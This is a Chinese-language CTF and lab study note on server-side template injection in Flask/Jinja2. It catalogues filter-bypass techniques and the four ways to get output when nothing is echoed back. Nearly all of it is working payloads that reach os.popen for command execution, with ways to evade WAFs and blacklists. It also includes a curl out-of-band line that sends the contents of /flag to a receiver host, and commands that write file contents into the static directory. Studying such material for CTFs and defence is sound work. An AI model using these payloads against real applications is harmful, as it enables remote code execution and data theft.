# SSTI 过滤绕过方法笔记

> 独立笔记（不放进四份讲义 —— 讲义严格按 task8 清单，这份是专项速查）
> 环境：Python 3.14.2 + Flask 3.1.3 + Jinja2 3.1.6 ｜ **本文件里所有结论都本机实测过**
> 相关：`3-Flask模板注入漏洞\练习-Part3.md` 的 C1~C7、`4-靶场实践\lab_ctf\ctf_app.py` 的 ch3~ch6

## 一、一句话原理

```
过滤检查  发生在「模板字符串进引擎之前」
~ 拼接    发生在「渲染时」
\x5f 转义 发生在「编译时」
```

**检查在前，还原在后** —— 中间这段缝隙就是所有绕过的立足点。
绕过不是"另一种攻击"，而是**同一个攻击换一套语法**。

## 二、三个抽屉：绕过时就在这里面换零件

### 抽屉一 · 字符串从哪来（6 种来源，全部实测）

| 来源 | 写法 | 实测输出 | 什么时候用 |
|---|---|---|---|
| 字面量 | `'os'` | `'os'` | 引号没被禁，最省事 |
| 拼接（`~`） | `'o'~'s'` | `'os'` | 关键词被禁 |
| 转义（`\xNN`） | `'\x5f\x5fglobals\x5f\x5f'` | `__globals__` | 下划线被禁 |
| **`dict()` 造名字** | `dict(__globals__=1)\|first` | `'__globals__'` | **引号被禁**（kwargs 的键不需要引号） |
| URL 参数 | `request.args.c` | `'os'` | 原文里不想出现该词 |
| 从对象抠字符（首/末） | `(lipsum\|string)\|first` / `\|last` | `'<'` / `'>'` | **中括号被禁**时的取字符 |
| 从对象抠字符（第 N 个） | `lipsum\|string\|list\|batch(19)\|first\|last` | `'_'` | 要一个"符号"（如下划线）时 |
| 从 dict 抠键名 | `(x\|attr('__globals__'))\|first` | `'__name__'` | 不用引号拿到一个真实名字 |

### 抽屉二 · 属性怎么取（5 种，全部实测）

| 写法 | 实测 | 备注 |
|---|---|---|
| `a.b` | 能 | 默认；属性优先，失败再试下标 |
| `a['b']` | 能 | 只做下标 |
| `a\|attr('b')` | 能 | 只做属性 → 禁点号时的首选 |
| `a\|attr('__getitem__')('b')` | 能 | 禁点号 + 禁中括号时的万能写法 |
| `a\|first` / `\|last` / `\|list` | `'__name__'` / `'Namespace'` | 不用中括号也能取首项/末项 |

### 抽屉三 · 结果怎么写（3 种，全部实测）

| 写法 | 实测 | 什么时候用 |
|---|---|---|
| `{{ x }}` | 正常输出 | 默认 |
| `{% print(x) %}` | 执行成功 | `{{` `}}` 被禁 |
| `{% if x %}yes{% endif %}` | 输出 `yes` | 禁输出 + 盲注（只看真假） |

## 三、按「禁什么」直接查表（全部实测通过）

| 被禁 | 换成什么 | 完整 payload |
|---|---|---|
| `.` | `\|attr('名')` | `{{ lipsum\|attr('__globals__')\|attr('__getitem__')('os')\|attr('popen')('whoami')\|attr('read')() }}` |
| `_` | `\x5f` | `{{ lipsum\|attr('\x5f\x5fglobals\x5f\x5f')\|attr('\x5f\x5fgetitem\x5f\x5f')('os')\|attr('popen')('whoami')\|attr('read')() }}` |
| `os` `popen` `read` | `~` 拼接 | `{{ lipsum\|attr('__glo'~'bals__')\|attr('__getitem__')('o'~'s')\|attr('po'~'pen')('whoami')\|attr('re'~'ad')() }}` |
| `{{` `}}` | `{% print %}` | `{% print(lipsum.__globals__['os'].popen('whoami').read()) %}` |
| `'` `"` | `dict()` 造名字 | 见第四节 |
| `.` + `'` 一起禁 | `\|attr` + `dict()` | 见第四节 |
| `.` + `_` + 关键词 | 三招合体 | `{{ lipsum\|attr('\x5f\x5fglobals\x5f\x5f')\|attr('\x5f\x5fgetitem\x5f\x5f')('o'~'s')\|attr('po'~'pen')('id')\|attr('re'~'ad')() }}` |

## 四、硬核组合：禁点号 + 禁引号（不依赖 URL 参数）

```jinja
{{ lipsum|attr(dict(__globals__=1)|first)|attr(dict(__getitem__=1)|first)(dict(os=1)|first)|attr(dict(popen=1)|first)('whoami')|attr(dict(read=1)|first)() }}
```

实测：命令执行成功。

它为什么重要：字符串全部由 `dict(名字=1)|first` 在**模板内部**造出来，
**完全不读 URL 参数** —— 所以"过滤所有请求参数"这种 WAF 也挡不住它。

## 五、字符串的四种载体（换部位，绕"只过滤参数"的 WAF）

| 载体 | 写法 | 实测 |
|---|---|---|
| URL 参数 | `request.args.c`（`?c=os`） | `'os'` |
| 请求头 | `request.headers['X-Name']` / `request.headers.get('X-Name')` | `'popen'` |
| Cookie | `request.cookies['ck']` / `request.cookies.ck` | `'read'` |
| 表单 | `request.form.x`（POST body） | 同理 |

混用载体也能跑通（Header 给 `popen`、Cookie 给 `read`）：

```jinja
{{ lipsum.__globals__['os']|attr(request.headers['X-Name'])('whoami')|attr(request.cookies.ck)() }}
```

实测输出：`laptop-59ul2kdl\暗炎魔主`

**`request.args.c` 到底是什么**：

- `request` = Flask 注入模板的当前请求对象
- `request.args` = URL 里 `?` 后面那串查询参数解析出的字典（Werkzeug 的 `ImmutableMultiDict`）
- `.c` = 取名为 `c` 的参数值；点号只是写法，等价于 `request.args['c']`
- 它**本来不支持属性访问**（`getattr(args,'c')` 会失败），能用是因为 **Jinja2 的点号失败会回退到下标**

实测细节：

| 情况 | 结果 |
|---|---|
| `?c=os`，`{{ request.args.c }}` | `'os'` |
| `?c=os&c=second`，`{{ request.args.c }}` | `'os'`（**取第一个**） |
| `?c=os&c=second`，`{{ request.args.getlist('c') }}` | `['os', 'second']` |
| 参数不存在，`{{ request.args.zzz }}` | 空（Undefined 渲染成空字符串） |
| 参数只用来传名字 | `{{ lipsum\|attr(request.args.a)\|length }}` → `51` |

## 六、动手流程：四步，每步都发一次请求

```
① 探能否执行     {{7*7}}                 → 出 49 才继续
② 探禁项（逐个最小样本）
                 {{''.__class__}}        → 测点号
                 {{''['__class__']}}     → 测中括号
                 {{ 'a' }}               → 测引号
                 {%print(7*7)%}          → 测 {{ }}
                 {{'os'}}                → 测关键词
                 顺带发个 &x=1           → 测"是否连其他参数也过滤"
③ 分段搭链（别一步到位）
                 {{ dict(os=1)|first }}                              → 'os'        字符串造出来了
                 {{ lipsum|attr(dict(__globals__=1)|first)|length }}  → 51          属性取到了
                 {{ lipsum|attr(...)|attr(...)(...) }}                → 'whoami'    命令执行了
④ 收尾           有回显用 read()；无回显改读文件 / 写文件到静态目录 / 盲注
```

第 ③ 步最关键：**先验证字符串造对了，再验证属性取到了，最后才接 `.popen()`**。
一次性写完整条链、结果却是空白，你根本不知道断在哪一环。

## 七、报错对照表

| 现象 | 原因 | 改法 |
|---|---|---|
| 输出空白 | 属性取不到 → Undefined（静默失败） | 名字拼错，或 dict 该用 `['键']` / `\|attr('__getitem__')('键')` |
| `UndefinedError: 'dict object' has no attribute 'x'` | 用 `\|attr` 取 dict 的键 | 改 `['x']` 或 `\|attr('__getitem__')('x')` |
| `KeyError: 'os'` | 那个模块没 `import os` | 走 `['__builtins__']['__import__']('os')` |
| `'wrapper_descriptor' has no attribute '__globals__'` | 挑到的类没自己定义 `__init__` | 换类，或用 `\|selectattr('__name__','equalto','catch_warnings')\|first` |
| 输出还是原文 `{{7*7}}` | 没进模板引擎 | 换注入点 |
| 空、也不报错 | 沙箱 | 语法改写无效（需要沙箱逃逸，另一条线） |

## 八、边界：这些招对沙箱无效（实测）

| 模板写法 | 普通环境 | 沙箱环境（SandboxedEnvironment） |
|---|---|---|
| `{{ lipsum.__globals__ }}` | 拿到字典 | 空（被拦） |
| `{{ lipsum\|attr('__globals__') }}` | 拿到字典 | 空（被拦） |
| `{{ lipsum['__globals__'] }}` | 拿到字典 | 空（被拦） |
| `{{ lipsum\|attr('\x5f\x5fglobals\x5f\x5f') }}` | 拿到字典 | 空（被拦） |
| `{{ 'o'~'s' }}` | `'os'` | `'os'`（照样能跑） |

**原因**：沙箱不看原文，而是在**取属性那一刻**拿"解析后的名字"判断（`__globals__` 以 `_` 开头 → 拦）。
所以换多少种语法都一样拦。而 `'o'~'s'` 照样能跑，是因为沙箱管"取属性"、不管"拼字符串"。

## 九、原 payload 与绕过 payload 的逐段对照

原始 payload（无过滤时）：

```jinja
{{ lipsum.__globals__['os'].popen('whoami').read() }}
```

以「禁点号 + 禁引号」的版本为例：

```jinja
{{ lipsum|attr(dict(__globals__=1)|first)|attr(dict(__getitem__=1)|first)(dict(os=1)|first)|attr(dict(popen=1)|first)('whoami')|attr(dict(read=1)|first)() }}
```

逐段对照（**语义完全相同，只是每个语法节点换了形式**）：

| 段 | 原写法 | 绕过写法 | 为什么检查不到 |
|---|---|---|---|
| 输出 | `{{ ... }}` | `{{ ... }}`（本例没禁）或 `{% print(...) %}` | 原文里没有被禁的定界符 |
| 取 `lipsum` 的属性 | `.__globals__` | `\|attr(dict(__globals__=1)\|first)` | 属性名变成"运行期算出来的字符串"，原文里没有点号、也没有引号 |
| 取 `os` | `['os']` | `\|attr('__getitem__')(dict(os=1)\|first)` | 键名由 `dict()|first` 生成，原文没有 `'os'` |
| 调 `popen` | `.popen('whoami')` | `\|attr(dict(popen=1)\|first)('whoami')` | 方法名同样在运行期才拼出来 |
| 读结果 | `.read()` | `\|attr(dict(read=1)\|first)()` | 同上 |

**四个本质区别**：

1. **字符串来源变了**：从"字面量"变成"运行期产物"（参数值 / `~` 拼接 / `dict()` 键名）。
2. **属性名的身份变了**：从"源码里的标识符"变成"传给 `attr` 过滤器的字符串参数"。
3. **违禁字符的存在时间变了**：`\x5f`、`~` 让它们在**编译期/渲染期**才出现，而过滤只看**编译前**的原文。
4. **代价**：payload 更长、可读性更差、依赖更多前提（`attr` 过滤器可用、`dict` 全局可用、参数不被过滤、目标不是沙箱）；
   而且**语义没有任何变化** —— 它还是同一条链，只是换了写法。

## 十一、`|first` 的两种活：造名字 vs 抠字符

同一个过滤器，左边是什么，干的事就不同 —— 最常混的一处：

| 左边是 | `\|first` 干什么 | 例子 | 结果 |
|---|---|---|---|
| **字典** | 取第一个**键** | `dict(globals=true)\|first` | `'globals'`（造字符串） |
| **字符串** | 取第一个**字符** | `(lipsum\|string)\|first` | `'<'`（抠符号） |
| **列表** | 取第一个元素 | `[a, b]\|first` | `a` |

**取第 N 个的三件套**（中括号被禁时的下标替身）：

```jinja
值|first                              第 1 个
值|last                               最后一个
值|string|list|batch(N)|first|last     第 N 个字符
```
```text
{{ lipsum|string|list|first }}                -> '<'
{{ lipsum|string|list|last }}                 -> '>'
{{ lipsum|string|list|batch(19)|first|last }} -> '_'
```
读法：变字符列表 → 每 N 个切一组 → 取第一组（前 N 个）→ 取这组最后一个 = 第 N 个位置。

## 十二、工具与值：什么时候必须加括号

链条上每一步的产物只有两类，**括号只跟在"工具"后面**：

| 形态 | 是什么 | 要 `( )` 吗 |
|---|---|---|
| `<function …>` / `<built-in method …>` / `<class …>` | 工具（函数/方法/类） | ✅ 要（类调用 = 造实例） |
| `{…}` / `'串'` / `123` / `<module …>` / 普通对象 | 值 | ❌ 不要 |

```text
判断：① 打印出来看形态  ② 名字是动词（get/read/popen/keys）多半是方法
      ③ 让模板回答：{{ 表达式|attr(dict(__call__=1)|first) is defined }} → True 就是工具
```

**取键为什么比取属性多一步**：属性有专门过滤器 `attr`；键没有（Jinja2 里取键本来是中括号的活），只能借字典的 `get` 方法：

```jinja
字典|attr(dict(get=1)|first)(dict(键=1)|first)
     └─ 取工具（竖线）─┘└─ 用工具（圆括号）─┘
g|attr('os')        -> 空（attr 只找属性、不回退，取不到键）
g|attr('get')('os') -> <module 'os'>（借工具成功）
```

**绑定方法（bound method）**：`q = 字典|attr(dict(get=1)|first)` 拿到的是"带着字典的方法"——

```text
{{ q|attr(dict(__self__=1)|first)|length }}  -> 51     ← __self__ 就是它绑定的那个字典
q('os')  ==  q.__self__['os']  ==  (那个字典)['os']

所以：q(...) 是【做】，不需要 |attr（|attr 是【找】）
      q|attr('os') -> 空    （在方法对象身上找 os，没有）
      q('os')      -> os 模块（让 q 去它绑定的字典里找，有）
```

## 十三、`dict(名=1)` 的三条限制

| 限制 | 说明 | 反例 |
|---|---|---|
| 键名必须是**合法标识符** | 字母/数字/下划线，不能数字开头、不能带 `-` 或空格 | `dict(a-b=1)`、`dict(1a=1)`、`dict(a b=1)` 全报语法错 |
| 多个键取**先写的那个** | 按书写顺序 | `dict(a=1,b=2)\|first` → `'a'`；`dict(b=1,a=2)\|first` → `'b'` |
| 值是**占位符** | 写什么都行 | `dict(os=1)` / `dict(os=true)` / `dict(os=none)` 都得 `'os'` |

所以**符号类字符**（`/`、`<`、空格）造不出来 → 只能从对象自己的字符串里抠（见第十一节）。

## 十四、三关黑名单对照（L11 / L12 / L13）

同一批写法在三关各自的命运（实测）：

| 写法 | L11 | L12 | L13 |
|---|---|---|---|
| `{{ 'q' }}`（引号） | 拦 | 拦 | 拦 |
| `{{ a.b }}`（点号） | 拦 | 拦 | 拦 |
| `{{ [1] }}`（中括号） | 拦 | 拦 | 拦 |
| `{{ 1+1 }}`（加号） | 拦 | **过** | 拦 |
| `{{ a_b }}`（下划线） | **过** | 拦 | 拦 |
| `{{ 123 }}`（数字） | **过** | 拦 | **过** |
| `{{ request }}` | 拦 | **过** | 拦 |
| `dict(__globals__=1)\|first` | **过** | 拦 | 拦 |
| `lipsum\|string\|list\|batch(19)\|first\|last` | **过** | 拦 | **过** |

| 每关还剩什么 | L11 | L12 | L13 |
|---|---|---|---|
| `dict(名=1)` 造名字 | ✅ | ❌ | ✅ |
| 带下划线的名字 | ✅ | ❌ | ❌ |
| `request` 参数通道 | ❌ | ✅ | ❌ |
| 出路 | 就地造 + 抠字符 | 从参数拿（`true` 顶数字） | 先抠 `_` 再拼 dunder |

**第 13 关专属坑**：黑名单是**子串**匹配 —— `dict(app=true)` 会被拦（含 `app`），要拆成 `dict(ap=true)~dict(p=true)`。
## 十、一句话总结

```
禁点号   → |attr('名')
禁中括号 → |attr('__getitem__')('名') / |first / |last
禁引号   → dict(名=1)|first        ← 最容易被忽略的一招
禁下划线 → \x5f
禁关键词 → 'a'~'b'
禁 {{ }} → {% print(...) %}
换载体   → args / headers / cookies / form
对沙箱   → 以上全部无效
```

## 十五、无回显（输出被丢弃）时的四种输出通道

上面十四节讲的都是「**过滤**」；这一节讲另一种情况：**没有过滤，模板也执行了，但渲染结果被业务代码丢掉**。

典型源码（klf 靶机）：

```python
render_template_string(template % name)   # 执行了
return render_template('klf.html')        # 但返回值没人要
```

### 15.1 先改判据：用「炸不炸」代替「看不看得见」

```text
{{ 1+1 }}  → 200   执行成功
{{}}       → 500   语法错 → 被当模板解析了
{{ 1/0 }}  → 500   运行时异常 → 真的执行了
```

**关键**：`{{7*7}}` 不出 49 **不能**推出「没注入」。单引用一个不存在的名字只会得到 Undefined（静默、200），**调用**它才会炸 —— 所以探针要写成调用的形式。

```text
{{ nosuch }}                         → 200（Undefined 渲染成空）
{{ nosuch() }}                       → 500（调用 Undefined 报错）
{{ lipsum.__globals__.os.popen('id').read() }}  → 200（链通、但结果被丢）
```

这个 200/500 探针在**还没有回显通道**时就能逐段验证链条断在哪。

### 15.2 通道一：异常回显（最快，1 次请求）

Werkzeug 的默认 404 页会把 `description` 原样写进 `<p>`：

```jinja
{{lipsum.__globals__.__builtins__.__import__('flask').abort(404, description='PING')}}
```

→ `<title>404 Not Found</title><h1>Not Found</h1><p>PING</p>`

把数据塞进去：

```jinja
{{lipsum.__globals__.__builtins__.__import__('flask').abort(404, description=lipsum.__globals__.os.popen('id').read())}}
```

要点：

| 点 | 说明 |
|---|---|
| `description` 必须是 **str** | `popen(...).read()` 是 str ✓；`os.system(...)` 是 **int** ✗（页面只会出现 `0`） |
| `lipsum` 出现两次不是嵌套 | 两条并列链：一条到 `flask.abort`，一条到 `os.popen` |
| 只写一次 | `{% set G = lipsum.__globals__ %}{{G.__builtins__.__import__('flask').abort(404, description=G.os.popen('id').read())}}` |
| 状态码是 404 | 正常，flag 在正文里，别看到 404 就以为失败 |

### 15.3 通道二：写进静态目录（最「基础」，2 次请求）

`Flask(__name__)` 默认注册 `/static/<文件名>`，所以把结果写进 static 就能用浏览器读：

```jinja
{{lipsum.__globals__.os.popen('pwd > static/o.txt').read()}}
```

然后 `GET /static/o.txt`。

**自举**：不知道绝对路径时先用相对路径（命令的 cwd 继承 Flask 进程）：

```text
popen('pwd > static/o.txt')            → 拿到 cwd
popen('ls -laR /app > static/o.txt')   → 拿目录结构
popen('cat /app/fl4gfl4gfl4g > static/leak.txt')  → 拿文件
```

写失败（404）说明 cwd 或 static 位置不对，换绝对路径再试。

### 15.4 通道三：外带 OOB（要外网 + 接收端）

```jinja
{{lipsum.__globals__.__builtins__.__import__('flask').abort(404, description=lipsum.__globals__.os.popen('curl http://接收端/?=$(cat /flag)').read())}}
```

注意 `$(...)` 不能省，否则 `/flag` 会被当成第二个 URL 参数；query 里 `+` 等于空格。

### 15.5 通道四：时间盲注（最兜底）

```jinja
{% for i in range(9000000) %}a{% endfor %}
```

实测 2.28 秒（基线 0.15 秒）。没有回显、不能写文件、不能出网时只剩这条。

### 15.6 四条通道怎么选

| 通道 | 请求数 | 前提 | 结果在哪 |
|---|---|---|---|
| 异常回显 | 1 | 能抛 HTTPException | 404 页面正文 |
| 写 static | 2 | static 可写且被服务 | `/static/x.txt` |
| 外带 OOB | 1 | 目标能出网 + 有接收端 | 接收端日志 |
| 时间盲注 | 多 | 只要能执行 | 响应耗时 |

判断顺序：**能抛异常就用异常**（最快）→ 不能就写文件 → 再不能才盲注。

### 15.7 三个高频错误

| 错误 | 现象 | 正确做法 |
|---|---|---|
| 把 `__import__` 当命令执行 | `__import__('ls -la')` → 500 `ModuleNotFoundError` | `__import__` 只导入模块；执行命令用 `os.popen('ls -la')` |
| `.builtins` 少下划线 | 500，且 `'builtins' in globals` 为 False | `.__builtins__` |
| 复制外来 WP 丢了 `__` | 链在 `.class` 就断 | Markdown 会把 `__class__` 渲染成加粗，复制前先看源码 |

> 完整实战（含找 flag 过程与诱饵识别）→ [writeups/极客大挑战SYC/klf-ssti.md](../writeups/极客大挑战SYC/klf-ssti.md)
